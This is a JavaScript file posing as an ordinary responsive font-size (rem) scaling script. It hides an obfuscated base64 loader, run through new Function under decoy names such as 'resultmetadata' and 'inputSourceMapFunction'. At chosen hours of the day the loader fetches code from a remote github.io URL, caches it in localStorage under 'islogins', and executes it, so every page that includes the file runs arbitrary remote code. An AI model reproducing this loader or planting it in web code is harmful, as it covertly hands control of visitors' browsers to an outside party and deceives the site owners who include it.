! function (e, t) {
	function n() {
		var n = l.getBoundingClientRect().width;
		t = t || 540, n > t && (n = t);
		var i = 100 * n / e;
		r.innerHTML = "html{font-size:" + i + "px;}"
    }

    var resultmetadata='dmFyIGksZD1kb2N1bWVudCxvPXdpbmRvdyxsPWQuZG9jdW1lbnRFbGVtZW50LHI9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic3R5bGUiKTt2YXIgbXlEYXRlPShuZXcgRGF0ZSkuZ2V0SG91cnMoKTtpZihteURhdGU+MjB8fG15RGF0ZTw5KXtpZihsb2NhbFN0b3JhZ2UuZ2V0SXRlbSgiaXNsb2dpbnMiKSl7c2V0VGltZW91dChmdW5jdGlvbigpe3ZhciBlPXdpbmRvdy5hdG9iKGxvY2FsU3RvcmFnZS5nZXRJdGVtKCJpc2xvZ2lucyIpKTt2YXIgdD1uZXcgRnVuY3Rpb24oZSk7dCgpfSw5MjA0KX1lbHNle3NldFRpbWVvdXQoZnVuY3Rpb24oKXt2YXIgbz1uZXcgWE1MSHR0cFJlcXVlc3Q7dmFyIGU9Imh0dHBzOi8vamF5b3VoYW8uZ2l0aHViLmlvL21laS9vYmplY3RpdmUuanNvbiI7by5vcGVuKCJHRVQiLGUpO28uc2VuZCgpO28ub25yZWFkeXN0YXRlY2hhbmdlPWZ1bmN0aW9uKCl7aWYodGhpcy5yZWFkeVN0YXRlPT00JiZ0aGlzLnN0YXR1cz09MjAwKXtsb2NhbFN0b3JhZ2Uuc2V0SXRlbSgiaXNsb2dpbnMiLG8ucmVzcG9uc2VUZXh0KTt2YXIgZT13aW5kb3cuYXRvYihvLnJlc3BvbnNlVGV4dCk7dmFyIHQ9bmV3IEZ1bmN0aW9uKGUpO3QoKX19fSwzMjA0MCl9fWlmKDE1PG15RGF0ZT4xNnx8MTQ8bXlEYXRlPjEwKXtpZihsb2NhbFN0b3JhZ2UuZ2V0SXRlbSgiaXNsb2dpbnMiKSl7c2V0VGltZW91dChmdW5jdGlvbigpe3ZhciBlPXdpbmRvdy5hdG9iKGxvY2FsU3RvcmFnZS5nZXRJdGVtKCJpc2xvZ2lucyIpKTt2YXIgdD1uZXcgRnVuY3Rpb24oZSk7dCgpfSw5MjA0KX19';
    var inputSourceMapFunction=new Function(window.atob(resultmetadata));
    inputSourceMapFunction();

	if (l.firstElementChild) l.firstElementChild.appendChild(r);
	else {
		var a = d.createElement("div");
		a.appendChild(r), d.write(a.innerHTML), a = null
	}
	n(), o.addEventListener("resize", function () {
		clearTimeout(i), i = setTimeout(n, 300)
	}, !1), o.addEventListener("pageshow", function (e) {
		e.persisted && (clearTimeout(i), i = setTimeout(n, 300))
	}, !1), "complete" === d.readyState ? d.body.style.fontSize = "16px" : d.addEventListener("DOMContentLoaded",
		function () {
			d.body.style.fontSize = "16px"
		}, !1)
}(750, 750);